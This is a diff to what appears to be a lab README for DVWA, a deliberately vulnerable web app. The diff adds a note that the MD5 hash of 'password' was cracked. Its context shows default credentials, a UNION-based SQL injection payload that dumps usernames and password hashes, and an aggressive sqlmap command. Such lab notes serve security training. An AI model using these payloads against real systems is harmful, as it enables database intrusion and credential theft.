@@ -9,6 +9,7 @@ docker run --rm -it -p 80:80 vulnerables/web-dvwa
 2. reset/create database
 3. admin:password
 4. `%' and 1=0 union select null, concat(user,':',password) from users`
+5. The MD5 hash: 5f4dcc3b5aa765d61d8327deb882cf99 was succesfully reversed into the string: password.
 
 ## SQL-injection scan example
 `sqlmap -r sqlmap.example --dbms=mysql --risk=3 --level=5`<br/>
